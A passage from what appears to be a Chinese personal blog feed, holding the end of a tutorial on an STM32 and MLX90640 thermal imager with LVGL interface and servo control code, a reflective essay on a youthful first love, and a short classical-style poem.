/><figcaption aria-hidden="true">chart</figcaption></figure><p>同时，我们在update_chart_task的回调函数中更新动画效果：</p><ul><li>通过箭头动画，指示温度直方图的最高温度点位置。<br /></li><li>通过直线动画，指示舵机的瞄准角度。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">update_pointer_anim</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> x_d, <span class="hljs-type">uint16_t</span> t_d)</span>&#123;<br>    lv_anim_set_values(&amp;pointer_anim, lv_obj_get_x(pointer_label), x_d);<br>    lv_anim_set_time(&amp;pointer_anim, t_d);<br>    lv_anim_start(&amp;pointer_anim);<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">update_line_x_anim</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> x_d, <span class="hljs-type">uint16_t</span> t_d)</span>&#123;<br>    lv_anim_set_values(&amp;pointer_line_x_anim, line_x_draw[<span class="hljs-number">0</span>].x, x_d);<br>    lv_anim_set_time(&amp;pointer_line_x_anim, t_d);<br>    lv_anim_start(&amp;pointer_line_x_anim);<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">update_line_y_anim</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> y_d, <span class="hljs-type">uint16_t</span> t_d)</span>&#123;<br>    lv_anim_set_values(&amp;pointer_line_y_anim, line_y_draw[<span class="hljs-number">0</span>].y, y_d);<br>    lv_anim_set_time(&amp;pointer_line_y_anim, t_d);<br>    lv_anim_start(&amp;pointer_line_y_anim);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>创建动画的过程也很简单，只需要设置动画的起始值和结束值，然后设置动画的时间，最后启动动画即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">create_pointer_anim</span><span class="hljs-params">()</span>&#123;<br>    pointer_label = lv_label_create(lv_scr_act());<br>    lv_label_set_text(pointer_label, <span class="hljs-string">&quot;1&quot;</span>);<br>    lv_obj_set_pos(pointer_label, <span class="hljs-number">0</span>, <span class="hljs-number">440</span>);<br>    lv_anim_init(&amp;pointer_anim);<br>    lv_anim_set_var(&amp;pointer_anim, pointer_label);<br>    lv_anim_set_values(&amp;pointer_anim, lv_obj_get_x(pointer_label), <span class="hljs-number">0</span>);<br>    lv_anim_set_time(&amp;pointer_anim, UPDATE_TIME);<br>    lv_anim_set_exec_cb(&amp;pointer_anim, anim_x_cb);<br>    lv_anim_set_path_cb(&amp;pointer_anim, lv_anim_path_overshoot);<br>    <span class="hljs-comment">// lv_anim_start(&amp;anim);</span><br>pointer_line_x = lv_line_create(lv_scr_act());<br>    pointer_line_y = lv_line_create(lv_scr_act());<br>    lv_line_set_points(pointer_line_x, line_x_draw, <span class="hljs-number">2</span>);<br>    lv_line_set_points(pointer_line_y, line_y_draw, <span class="hljs-number">2</span>);<br><br>    lv_anim_init(&amp;pointer_line_x_anim);<br>    lv_anim_init(&amp;pointer_line_y_anim);<br>    lv_anim_set_var(&amp;pointer_line_x_anim, pointer_line_x);<br>    lv_anim_set_var(&amp;pointer_line_y_anim, pointer_line_y);<br>    lv_anim_set_values(&amp;pointer_line_x_anim, line_x_draw[<span class="hljs-number">0</span>].x, <span class="hljs-number">320</span>+<span class="hljs-number">320</span>);<br>    lv_anim_set_values(&amp;pointer_line_y_anim, line_y_draw[<span class="hljs-number">0</span>].y, <span class="hljs-number">240</span>);<br>    lv_anim_set_time(&amp;pointer_line_x_anim, <span class="hljs-number">250</span>);<br>    lv_anim_set_time(&amp;pointer_line_y_anim, <span class="hljs-number">250</span>);<br>    lv_anim_set_exec_cb(&amp;pointer_line_x_anim, anim_line_x_cb);<br>    lv_anim_set_exec_cb(&amp;pointer_line_y_anim, anim_line_y_cb);<br>    <span class="hljs-comment">// // lv_anim_set_path_cb(&amp;pointer_line_x_anim, lv_anim_path_overshoot);</span><br>    <span class="hljs-comment">// lv_anim_start(&amp;pointer_line_x_anim);</span><br>    <span class="hljs-comment">// lv_anim_start(&amp;pointer_line_y_anim);</span><br>&#125;<br></code></pre></td></tr></table></figure><p>主要关注create_pointer_anim函数，我们创建了一个label控件，用于显示箭头动画，然后创建了两个line控件，用于显示直线动画，然后创建了两个动画，分别用于箭头动画和直线动画，设置动画的起始值和结束值、动画完成的时间，最后启动动画即可。</p><p>为了方便数据观察，我们定义了两个按键控件，用于切换显示模式，控制显示参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">lv_obj_t</span>* button_is_update = lv_btn_create(lv_scr_act());<br>lv_obj_align(button_is_update, LV_ALIGN_TOP_RIGHT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>lv_obj_add_flag(button_is_update, LV_OBJ_FLAG_CHECKABLE);<br>lv_obj_set_size(button_is_update, <span class="hljs-number">100</span>, <span class="hljs-number">70</span>);<br><span class="hljs-type">lv_obj_t</span>* label_is_update = lv_label_create(button_is_update);<br>lv_label_set_text(label_is_update, <span class="hljs-string">&quot;snapshot&quot;</span>);<br>lv_obj_align(label_is_update, LV_ALIGN_CENTER, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>lv_obj_add_event_cb(button_is_update, snap_stream_event, LV_EVENT_CLICKED, <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">lv_obj_t</span>* button_show_info = lv_btn_create(lv_scr_act());<br>lv_obj_align(button_show_info, LV_ALIGN_TOP_RIGHT, <span class="hljs-number">0</span>, <span class="hljs-number">90</span>);<br>lv_obj_add_flag(button_show_info, LV_OBJ_FLAG_CHECKABLE);<br>lv_obj_set_size(button_show_info, <span class="hljs-number">100</span>, <span class="hljs-number">70</span>);<br><span class="hljs-type">lv_obj_t</span>* label_show_info = lv_label_create(button_show_info);<br>lv_label_set_text(label_show_info, <span class="hljs-string">&quot;info&quot;</span>);<br>lv_obj_align(label_show_info, LV_ALIGN_CENTER, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>lv_obj_add_event_cb(button_show_info, is_show_info_event, LV_EVENT_CLICKED, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>其回调函数如下：<br /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">snap_stream_event</span><span class="hljs-params">(<span class="hljs-type">lv_event_t</span> *event)</span><br>&#123;<br>    <span class="hljs-type">lv_obj_t</span> *btn = lv_event_get_target(event);                    <span class="hljs-comment">// 获得调用这个回调函数的对象</span><br>    <span class="hljs-keyword">if</span> (event-&gt;code == LV_EVENT_CLICKED)<br>    &#123;<br>        <span class="hljs-type">lv_obj_t</span> *label = lv_obj_get_child(btn, <span class="hljs-literal">NULL</span>);             <span class="hljs-comment">// 获取第1个子对象(我们在设计时，已安排了它的第1个子对象是一个label对象)</span><br>        is_update = !is_update;<br><span class="hljs-keyword">if</span>(is_update)&#123;<br>lv_label_set_text_fmt(label, <span class="hljs-string">&quot;snapshot&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>lv_label_set_text_fmt(label, <span class="hljs-string">&quot;streaming&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">is_show_info_event</span><span class="hljs-params">(<span class="hljs-type">lv_event_t</span> *event)</span><br>&#123;<br><span class="hljs-type">lv_obj_t</span> *btn = lv_event_get_target(event);                    <span class="hljs-comment">// 获得调用这个回调函数的对象</span><br><br><span class="hljs-keyword">if</span> (event-&gt;code == LV_EVENT_CLICKED)<br>&#123;<br><span class="hljs-keyword">if</span>(!is_info_show)&#123;<br>hide_labels();<br>is_info_show = <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>show_labels();<br>is_info_show = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>snapshot和streaming用于切换显示模式，info用于显示温度信息，通过这两个按键控件，我们可以方便地切换显示模式，控制显示参数。在snapshot模式下，我们暂停图像流，只显示当前图像，方便观察数据，而在streaming模式下，我们显示图像流，实时显示数据。</p><p>至此，我们就完成了大部分图形界面的设计，实现了热成像图的显示、温度直方图的显示、舵机瞄准示意图的显示等功能。最后的温度统计信息的显示，我们可以通过lv_label_create函数创建label控件，然后通过lv_label_set_text函数设置文本内容，实时更新数据即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 独立的标签</span><br>label_max_min_temp = lv_label_create(lv_scr_act());<br>lv_label_set_text(label_max_min_temp, <span class="hljs-string">&quot;initial&quot;</span>);<br>lv_obj_set_pos(label_max_min_temp, <span class="hljs-number">320</span>+<span class="hljs-number">10</span>, <span class="hljs-number">240</span>+<span class="hljs-number">10</span>);<br>label_max_min_temp_xy = lv_label_create(lv_scr_act());<br>lv_label_set_text(label_max_min_temp_xy, <span class="hljs-string">&quot;initial&quot;</span>);<br>lv_obj_set_pos(label_max_min_temp_xy, <span class="hljs-number">320</span>+<span class="hljs-number">10</span>, <span class="hljs-number">240</span>+<span class="hljs-number">40</span>);<br>label_servo_angle = lv_label_create(lv_scr_act());<br>lv_label_set_text(label_servo_angle, <span class="hljs-string">&quot;initial&quot;</span>);<br>lv_obj_set_pos(label_servo_angle, <span class="hljs-number">320</span>+<span class="hljs-number">10</span>, <span class="hljs-number">240</span>+<span class="hljs-number">70</span>);<br>label_mean_variance = lv_label_create(lv_scr_act());<br>lv_label_set_text(label_mean_variance, <span class="hljs-string">&quot;initial&quot;</span>);<br>lv_obj_set_pos(label_mean_variance, <span class="hljs-number">320</span>+<span class="hljs-number">10</span>, <span class="hljs-number">240</span>+<span class="hljs-number">110</span>);<br>label_time_stamp = lv_label_create(lv_scr_act());<br>lv_label_set_text(label_time_stamp, <span class="hljs-string">&quot;initial&quot;</span>);<br>lv_obj_set_pos(label_time_stamp, <span class="hljs-number">220</span>+<span class="hljs-number">400</span>, <span class="hljs-number">240</span>+<span class="hljs-number">10</span>);<br></code></pre></td></tr></table></figure><p>更新数据时，只需要调用lv_label_set_text函数设置文本内容即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">sprintf</span>(output_max_min_temp, <span class="hljs-string">&quot;max T: %.2f \tmin T: %.2f&quot;</span>, max_temp, min_temp);<br><span class="hljs-built_in">sprintf</span>(output_max_min_temp_xy, <span class="hljs-string">&quot;max x: %d y: %d \tmin x: %d y: %d&quot;</span>, max_temp_x, max_temp_y, min_temp_x, min_temp_y);<br><span class="hljs-built_in">sprintf</span>(output_servo_angle, <span class="hljs-string">&quot;servo 0: %d \tdegree\nservo 1: %d \tdegree&quot;</span>, (<span class="hljs-type">int</span>)(<span class="hljs-number">90</span> * (<span class="hljs-type">float</span>)max_temp_x / <span class="hljs-number">32</span>), (<span class="hljs-type">int</span>)(<span class="hljs-number">45</span> * (<span class="hljs-type">float</span>)max_temp_y / <span class="hljs-number">24</span>));<br><span class="hljs-built_in">sprintf</span>(output_mean_variance, <span class="hljs-string">&quot;mean: %.2f \tvariance: %.2f&quot;</span>, mean_temp, variance_temp);<br><span class="hljs-built_in">sprintf</span>(output_time_stamp, <span class="hljs-string">&quot;time: %d s %d ms&quot;</span>, time_s, time_ms);<br>lv_label_set_text(label_max_min_temp, output_max_min_temp);<br>lv_label_set_text(label_max_min_temp_xy, output_max_min_temp_xy);<br>lv_label_set_text(label_servo_angle, output_servo_angle);<br>lv_label_set_text(label_mean_variance, output_mean_variance);<br>lv_label_set_text(label_time_stamp, output_time_stamp);<br></code></pre></td></tr></table></figure><p>完成了图形界面的设计后，我们就可以实现热成像图的显示、温度统计信息的显示、温度直方图的显示、舵机瞄准示意图的显示等功能。</p><figure><img src="/img/基于MLX90640的红外热成像仪/interface.png"alt="interface" /><figcaption aria-hidden="true">interface</figcaption></figure><h3 id="舵机驱动">6.3 舵机驱动</h3><p>上面我们已经实现了舵机的瞄准功能，这里我们简单介绍一下舵机的驱动，驱动非常简单，只需要通过PWM信号控制舵机的角度即可。</p><p>可以得到舵机的PWM信号的频率为50Hz，我们使用Timer1初始化舵机的PWM信号，然后通过设置占空比来控制舵机的角度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">SetServoAngle</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> id, <span class="hljs-type">uint8_t</span> angle)</span>&#123;<br>    <span class="hljs-type">uint16_t</span> pulse = <span class="hljs-number">1500</span>;<br>    <span class="hljs-keyword">if</span>(id == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">if</span>(angle &gt; <span class="hljs-number">90</span>)&#123;<br>angle = <span class="hljs-number">90</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(angle &lt; <span class="hljs-number">0</span>)&#123;<br>angle = <span class="hljs-number">0</span>;<br>&#125;<br>        pulse += <span class="hljs-number">11</span> * angle;<br>        TIM_SetCompare1(TIM1, pulse);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(id == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span>(angle &gt; <span class="hljs-number">45</span>)&#123;<br>angle = <span class="hljs-number">45</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(angle &lt; <span class="hljs-number">0</span>)&#123;<br>angle = <span class="hljs-number">0</span>;<br>&#125;<br>pulse += <span class="hljs-number">11</span> * (<span class="hljs-number">45</span>-angle);<br>        TIM_SetCompare1(TIM10, pulse); <span class="hljs-comment">//  修改比较值，修改占空比</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>定时更新舵机的角度即可。</p><h2 id="实验效果">7. 实验效果</h2><figure><img src="/img/基于MLX90640的红外热成像仪/stm32.png" alt="stm32" /><figcaption aria-hidden="true">stm32</figcaption></figure><figure><img src="/img/基于MLX90640的红外热成像仪/camera.png" alt="camera" /><figcaption aria-hidden="true">camera</figcaption></figure><p>上图为实验效果，我们可以看到，通过MLX90640红外热成像模块，我们可以实时显示热成像图，显示温度直方图，显示温度统计信息等，成功实现了一个简单的红外热成像仪。</p><p>视频文件有点大，可以在<ahref="https://www.bilibili.com/video/BV1pDCpYJEYo/">这里</a>查看。</p><h2 id="结论">8. 结论</h2><p>本项目基于MLX90640的红外热成像仪系统利用STM32F407作为核心控制单元，通过硬件与软件的深度结合，实现了高效的温度数据采集、处理和实时可视化展示。本系统采用模块化设计方法，将硬件抽象、数据处理、图形显示和系统控制等功能分层实现，不仅提高了代码的可读性和维护性，也为未来功能扩展提供了坚实基础。</p><p>本系统具有广泛的应用场景，包括工业设备的温度监测、医疗诊断中的热图成像、以及环境监测中的目标检测等，提供了一种低成本的红外热成像解决方案。</p><p>但受限于硬件性能和算法复杂度，本系统在实时性和精度上仍有待提高，图像刷新率较低，温度分辨率较低，需要进一步优化算法和硬件设计，提高系统性能。</p><h2 id="参考资料">9. 参考资料</h2><p>[1] <ahref="https://www.melexis.com/-/media/files/documents/datasheets/mlx90640-datasheet-melexis.pdf">MLX90640数据手册</a><br />[2] <ahref="https://github.com/melexis/mlx90640-library">官方驱动代码</a><br />[3] <ahref="https://github.com/imliubo/MLX90640-With-STM32">类似项目</a><br />[5] <a href="https://lvgl.io/">LVGL官方文档</a><br />[6] <ahref="https://github.com/symcreg/lvgl_mlx90640">本项目源码</a><br />[7] <ahref="https://www.bilibili.com/video/BV1pDCpYJEYo/">演示视频</a></p>]]></content>
    
    
    <categories>
      
      <category>单片机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红外热成像仪</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不客观和非爱情</title>
    <link href="/2024/12/28/%E4%B8%8D%E5%AE%A2%E8%A7%82%E5%92%8C%E9%9D%9E%E7%88%B1%E6%83%85/"/>
    <url>/2024/12/28/%E4%B8%8D%E5%AE%A2%E8%A7%82%E5%92%8C%E9%9D%9E%E7%88%B1%E6%83%85/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="不客观和非爱情">不客观和非爱情</h1><p><em>“一无所知的人也就一无所爱，什么都不做的人也就什么都不懂。什么都不懂的人是没有价值的。懂得事理的人也懂得爱、观察、发现……对事物本质了解得越多，也就越钟爱……设想所有水果和草莓同时成熟得人，对葡萄一无所知。”</em></p><p>如果成熟的果实才是甘甜的，那么青涩是不是毫无意义？不懂得事理、懵懂的时期，值得纪念吗？</p><p>灵动的眼神，清澈的声音，活跃的表情，身上总是香香。我对她心怀爱慕，却羞于启齿。</p><p>我的第一次爱慕也是最后一次爱慕始于我懵懂的初中时期，说是爱慕未免有些言重，更说明白一点就是小孩子对美好事物的感知、尝试吧。暂不提其中多多少少的曲折，只是宽度这段关系便横跨我的中学和大学两端，占据了我少年到青年的全部过程。从两米的距离拉长到一千一百公里，从单一的时刻错分成日日夜夜。我本人时常容易激起强烈兴趣，熊熊自我燃烧，而后这烈火又会飞速下降衰退。但这份不知名的感情从起始寄生在稚嫩的个体里，循环缠绕，蜷缩又舒张，如同一棵坚韧的植物，在春天和冬天螺旋往复，不断死去又复生。</p><p>初中那时我和她是同班同学，但不似寻常故事一见钟情。入学时我还未配眼镜，小学时隐隐约约就有些近视的感觉了，但我身材瘦小加上成绩不错便总被安排在前排位置，也惧怕被父母批评，虽说黑板边角细细微微字痕还是看不清晰，也没提过近视的事情。</p><p>不凑巧的是，升学那天我是最后晚到教室的，后门进入一眼看去座位上已经全是人了，扫视一圈看到最后几排有几个空位没想太多就入座了，同桌和后桌同是女生。这对我来说是一个挑战，从更小到初中，被长辈“夸奖”最多的就是内向、安静，作为一个男孩缺少一些阳光和活力，但最终也没弄懂是怎么养成。表面毫不在意，但暗地里我早就竖起耳朵听着同桌和后桌来回讲话嬉笑，心中也悄悄的笑。等到上课我才知道我的近视已经成为无法忽略的问题了。从我所在的倒数第二排到看向黑板，全是黑黑白白的斑点，惨兮兮，看不清一点字痕。第二天我就去配对眼镜了，从此就多了一个新的固定装扮。</p><p>我和她第一次相识是英语课的问答，或是某一次换桌后的邻座，或是数学题的讨教，但记忆中总找不到一个精确的端点。后来我才知道，我和她第一次的交集就在开学的那天，她帮助老师统计学生信息，唯独缺少我迟来的那份。她早早记下我的名字，我却毫无印象，于是我如偿还般不断地在人生铭刻，心底留下缺口，将她填充。我对爱的认识很浅，或者说对爱没有概念。无论是起起落落书写的此刻还是过去，我始终觉得我并不懂爱是什么，也看过一些书籍，但更加疑惑。现在回想起来很多事都已经模糊了，甚至当时那份感情、那份潮湿又炙热的幻想也记不清了。就像一个个默默的夏天，让人想起的时候就已经过去，那时闷热但心动，现在却只是汗流。</p><p>中学时期印象深刻的事情不多，心中浮现的总是反反复复的几件，但总模模糊糊的记不清晰，像梦后醒来一样，在现实和现实之上，间隔着一层薄薄的水，偶尔波浪浮动翻起沙尘，可幸运记起的那些事情让人感觉是真实的，又像是美好的幻想。</p><p>我和她都尤为喜爱初二时的英语老师，她在课上严肃认真，但私下却总是微笑，很是让人安心，教导起来耐心又仔细，帮助我搭建了很不错的英语基础。另一方面，这位严肃、严格、严厉的老师也很喜欢我和她，班上两个课代表便是我俩了，她时常叫我俩回答或者帮忙讲解问题，还将我们分为一组同学，坐在一起，一男一女。这让我对她更有好感。但当时却是不知，只觉得那时心中欣喜难言，直让内怯的人更讲不出话来。我和她各饰一角，演绎课本中的对话，我站在讲台不敢面向下方的同学，但更不敢看她的眼睛，她则大大方方、坦坦荡荡。虽然觉得尴尬，但每每英语课前我心中暗暗总有些期待，小小的两人组合让我窃喜，觉得有些特殊，有些契合。我从这平淡中也能尝出甜蜜。这次也会提问的吧？又能和她一起了？她也一定是这样想的吧？</p><p>我还记得我们做同桌的时候。我对她心中极为好奇和仰慕，但现实中反而不敢靠近，离她远远的，仿若靠近便是玷污和伤害。记得有次她问我数学题目，我在角落扫了一眼呜呼吐出几个不连贯的句子，便不再加以回应。当时只觉紧张又羞赧，我不敢去看她的表情，但想来定是十分困惑吧，当时羞于追问，现在也无处问询了。</p><p>抱有极大的好奇，我慢慢、远远、悄悄地靠近。仔细想想那时候，一切就像是被规定的推着向前，没有自我的想法，只是每天照常的生活着、学习中，突然之间就注意到另一个个体，此前她与其他人毫无不同，但恰在某一时刻就突然变得生动了、活泼了，仿佛一下拉近了许多，好像整个世界多了一些除了自己之外的东西，增加了许多生机。原来他人也和自己一样有趣。于是自一个小小的个体封闭的内心，枝芽伸出，以此为契机、养料慢慢地生长。对于那时来看，这份感情说是爱未免太过隆重，分为喜欢似也不妥，更多的也许是成长中对外界的好奇或者说渴望一个知己，希望了解，希望被了解。</p><p>也正如我想要的，她的存在满足了我的一切需要，替换了长久陪伴我的影子。我和她关系的进步是在初三时期。要分班了。团聚时我不能鼓起的勇气，在离散后反而从全身各处涌现。在周末的傍晚或是下午，我诉以衷肠。</p><p>她说她想要遇到和她默契的人，我自是不满足条件的。对一个只有课上公共必要的交流，私下却毫不了解的人，何谈默契与否？我默默将“默契”一词记录心中，仍怀揣着些美好的幻想。让人开心的是，这是我们交流的伊始，我那时自视不说甚高也是很高，中二也有几分幼稚的浪漫。结果是我们之间无话不谈。家庭问题，学业问题，处于青春时期的我们异质却又统一。升入高中我们进入不同学校，但关系并未远离，一经放假便兴奋的拿起手机，看看，听听，那些她所在，所经历的环境和事情。虽然从未亲身经历，但仅看着那些文字，相思、喜悦就要溢出心头。</p><p>但情况却愈是急转直下。对我来说，我以为我们足够了解了，每天不间断的聊天，也有了默契和心照不宣。我说：这就是喜欢吧，但可惜的是，对她来说不是。我们关系的破碎就以此为基础，现在想来不过无聊的争论，但那时却是万分紧急、性命攸关。我迫切地想要寻求我内心向往的恋情和虚荣，而她回应以我冷静。有趣的是，我们一边怀揣着不同的认知，一边更加依靠对方的支撑。</p><p>我的恋情是失败的。</p><p>如果这错综复杂的关系也如同寻常故事一般，以暗恋为始，只一个人在角落暗自欢喜，最后又以暗恋消散为终，那也算得上一段青春的美谈。但这一切逐渐超出两人能控制的边界，慢慢地沉入幼小年龄无法感知的深度，我只是懵懂着就做出了决定，做了想做和不想做的事情，做对了或者做错了。对她也是同样吧。我不断地向她逼近，不再满足于仍隔着一层的关系，而她则是略有懊恼地委婉回绝。自我最起始没有按捺住孤独，向她伸出感知的触角时，一切的恶果就已埋下。那支未能送出的木簪，我削削打磨，留下的却只有木屑和刀痕。我们两个人的丝线相互缠绕，传输着一言一语，思想交融，但也形成一个厚茧，让我们变得与外界分离，与其他一切遮上一团迷雾，阻挡着各自真实的视线，各自宽慰愚弄自己，视而也不见。我们仍挣扎着靠近，一边倾诉着心声，一边又狂躁地激起矛盾。就仿佛互相寄生着，我们之间的距离越来越近，但也越来越难以呼吸。也许这失败有许多因素，但当时只是争辩着、震怒着，然后坠落、眼泪、破碎。回想起来，很多事情、很多感情都难以理解，但对于那时来讲，都是呕心沥血的拥抱、真真切切的伤害罢。</p><p>之所以说我的恋情是失败的，并非是说我们的结果是分开。失败，因为这段漫长顽固的关系带给我、我们的有青春的欢喜和倾诉，但更多的是疼痛，它以一种无法洞察的形式伴随我们自身的生长，奠定了对恋爱、对人生的态度。我不够平庸，不甘心落得泯然众人的下场，所以不能像轻易地拿起那样轻易放下，切断后又纠缠；我不够出色，不能像手执火剑的天使，扫清面前、未来的障碍，所以维持不了这段关系长久完整，纠缠后又切断。也许我并不懂责任和尊重，只是固执地追求一个结果，不间断不考虑地靠近和逼迫，于是那一切就类似于控制、占有一般，侵蚀她的自由，以及我的自由。而我置身其中，深陷泥潭，进退不得。仿佛有一个暗中蛰伏的魔鬼将我的灵魂分割，其中一部分脱离我的躯壳，却牢牢的被困在她的身体里，于是有一种令人痴迷的魔力，驱使着我忍受空虚和饥饿，不断追赶和徘徊。</p><p>迷离月影，捉月水中。我和她分分合合有过许多次，高中是最高亢也是矛盾最激烈的时期。归根结底，我们对于爱的理解不同，对于人际关系的认识不同。这本身没什么坏的，但当我们靠得太近，纠缠太深，这便化成一条无形的绳索，拆绕两人的脖颈，无情地将其挂在绞刑台，若是挣扎不舍，越是痛苦窒息。即使如此，这绳索也让人如此着迷，不舍离开。</p><p>结束无声无息地降临于寂静和分离。于是我真正明白了默契的含义。在我们最终背道而驰后，我落入了虚无主义的深渊，但这又好像一种救赎，获得了内心的平静，我失去了一些感知，但也不再挣扎、痛苦。我仍然内心空洞，无力却已无需去填充，她面无表情地离开，找到新的寄托。回忆起来，那些时光就好像多年前阳台洒落的阳光，闪耀着光芒，但陈旧、模糊，又似一条粘稠又甜蜜的河，不断流动在我的身体，沉溺的灵魂在其中滚动起伏。我竭力回想，仍记不起她的样貌、话语。欢喜、悔恨、不甘、迷恋，都已逝去，存留于我身体的只有一种来自过去的回响，一种朦朦的感觉。夜晚仍照旧降临，熟悉的名称和身影却偶尔在梦中才有所接触。只是闲暇时候，幻象般的记忆还是会闪回，那时我们同坐在一间教室，余光是黑板上未抹净的白晕，我张嘴说着什么，周围有陌生的同学身影晃动，窗外透来几缕夕阳的光。</p><p>灵动的眼神，清澈的声音，活跃的表情，身上总是香香的。我对她心怀爱慕，却难以启齿。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>回忆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>孤夜山行</title>
    <link href="/2024/12/08/%E5%AD%A4%E5%A4%9C%E5%B1%B1%E8%A1%8C/"/>
    <url>/2024/12/08/%E5%AD%A4%E5%A4%9C%E5%B1%B1%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><center>孤夜山行</center><center>繁云絮雨萦孤月，淡雾疏星隐夜明。</center><center>寂坐幽岩山欲语，徒归空路影虚行。</center>]]></content>
    
    
    <categories>
      
      <category>诗词</category>
      
    </categories>
    
    
    <tags>
      
      <tag>七绝</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mengzi-t5微调古诗生成模型</title>
    <link href="/2024/12/08/mengzi-t5%E5%BE%AE%E8%B0%83%E5%8F%A4%E8%AF%97%E7%94%9F%E6%88%90%E6%A8%A1%E5%9E%8B/"/>
